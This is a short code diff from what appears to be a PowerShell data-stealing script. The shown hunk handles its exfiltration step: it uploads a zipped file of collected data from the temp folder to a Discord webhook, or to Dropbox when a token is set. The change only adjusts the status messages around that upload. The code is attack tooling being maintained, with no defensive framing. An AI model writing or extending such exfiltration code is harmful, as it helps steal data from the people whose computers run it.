@@ -502,8 +502,8 @@ if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 ############################################################################################################################################################
 # Upload output file to Discord
-Upload-Discord -text "Sending data..."
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
+else {Upload-Discord -text "Could not send data"}
 
 
 <#
